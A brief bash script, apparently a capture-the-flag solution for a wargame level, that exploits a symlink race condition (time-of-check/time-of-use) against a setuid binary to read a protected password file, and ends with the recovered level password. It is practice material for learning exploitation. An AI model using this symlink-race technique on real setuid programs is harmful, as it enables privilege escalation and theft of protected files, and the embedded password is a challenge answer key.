#!/bin/bash
# race condition

# run this script
while :
do
    ln -sf /dev/null /tmp/128ecf542a35ac5270a87dc740918404
    /maze/maze0
    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
    /maze/maze0
done

# password: kfL7RRfpkY